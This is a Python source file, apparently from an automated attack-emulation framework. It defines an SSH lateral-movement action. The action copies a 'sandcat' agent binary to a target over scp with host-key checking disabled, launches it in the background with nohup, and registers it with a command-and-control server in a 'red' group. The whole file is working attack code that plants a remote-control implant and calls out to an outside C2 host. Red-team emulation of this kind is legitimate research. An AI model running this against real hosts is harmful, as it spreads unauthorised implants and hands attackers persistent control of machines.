from ..low_level_action import LowLevelAction
from incalmo.models.agent import Agent
from incalmo.core.services.config_service import ConfigService


class SSHLateralMove(LowLevelAction):
    def __init__(self, agent: Agent, hostname: str):
        self.hostname = hostname
        server = ConfigService().get_config().agent_c2c_server
        ssh_opts = (
            "-o StrictHostKeyChecking=no "
            "-o UserKnownHostsFile=/dev/null "
            "-o ConnectTimeout=3"
        )
        remote = (
            "chmod +x ./sandcat_tmp.go 2>&1; "
            f"curl -s -m 5 -o /dev/null -w C2:%{{http_code}} {server}/ 2>&1; echo; "
            f"nohup ./sandcat_tmp.go -server {server} -group red >/tmp/sc.log 2>&1 & "
            "sleep 2; echo AGENTLOG:; head -c 300 /tmp/sc.log 2>/dev/null"
        )
        command = (
            f"{{ scp {ssh_opts} sandcat.go-linux {hostname}:~/sandcat_tmp.go && "
            f"ssh {ssh_opts} {hostname} "
            f"'{remote}' "
            f"&& echo LM_OK; }} 2>&1"
        )
        payloads = ["sandcat.go-linux"]
        super().__init__(agent, command, payloads, command_delay=3)
